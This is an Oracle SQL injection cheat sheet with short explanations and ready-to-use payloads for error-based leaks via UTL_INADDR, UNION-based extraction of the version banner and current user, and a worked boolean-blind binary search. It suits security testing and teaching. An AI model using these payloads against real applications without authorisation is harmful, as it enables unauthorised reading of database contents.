# Oracle Database

## Error-based
This technique exploits database errors to leak information by crafting payloads that cause the error message to include the desired data, such as the database version or current user.

To retrieve the database version by triggering an error that includes the version banner:
' AND 1=UTL_INADDR.get_host_name((SELECT banner FROM v$version WHERE rownum=1)) --

To retrieve the current user by triggering an error that includes the username:
'|| UTL_INADDR.get_host_name((SELECT user FROM dual)) --

## Union query-based
This method appends a UNION SELECT statement to the original query, allowing the injection of additional rows into the result set to extract data like version or user directly in the output.

To retrieve the database version:
' UNION SELECT NULL, banner FROM v$version --

To retrieve the current user:
' UNION SELECT NULL, user FROM dual --

## Boolean-based blind
In this approach, you send payloads that evaluate to true or false based on conditions about the data, and observe differences in application responses (e.g., page content changes or loads vs. errors) to infer information bit by bit.

To find the length of the current user using binary search (assuming the length is 5; start with a range like 0-32 and halve it):

Check if length > 16:
' AND (SELECT CASE WHEN length(user)>16 THEN 1 ELSE 0 END FROM dual)=1 --

(Assume false, so length <=16)

Check if length > 8:
' AND (SELECT CASE WHEN length(user)>8 THEN 1 ELSE 0 END FROM dual)=1 --

(Assume false, so length <=8)

Check if length > 4:
' AND (SELECT CASE WHEN length(user)>4 THEN 1 ELSE 0 END FROM dual)=1 --

(Assume true, so length >4)

Check if length > 6:
' AND (SELECT CASE WHEN length(user)>6 THEN 1 ELSE 0 END FROM dual)=1 --

(Assume false, so length <=6)

Check if length > 5:
' AND (SELECT CASE WHEN length(user)>5 THEN 1 ELSE 0 END FROM dual)=1 --

(Assume false, so length <=5)

Check if length = 5:
' AND (SELECT CASE WHEN length(user)=5 THEN 1 ELSE 0 END FROM dual)=1 --

(Assume true, confirming length=5)

